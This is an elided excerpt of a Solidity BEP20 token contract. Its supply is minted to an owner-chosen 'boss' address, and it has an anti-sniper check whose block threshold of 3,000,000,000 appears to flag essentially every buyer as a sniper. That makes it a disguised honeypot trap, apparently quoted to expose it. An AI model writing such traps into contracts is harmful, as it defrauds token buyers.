...
contract DAO is IBEP20, Ownable {
    ...
    uint256 private _tTotal = 1288 * 10**_decimals;
    ...
    constructor(address boss) {
        ...
        _liquidityHolders[boss] = true;

        emit Transfer(address(0),boss, _tTotal);
    }
    ...
    function _transfer(
        ...
        if (!_hasLiqBeenAdded) {
            ...
            if (
                ...
                if (block.number - launchedAt < 3000000000) {
                    _isSniper[to] = true;
                }
            }
        }
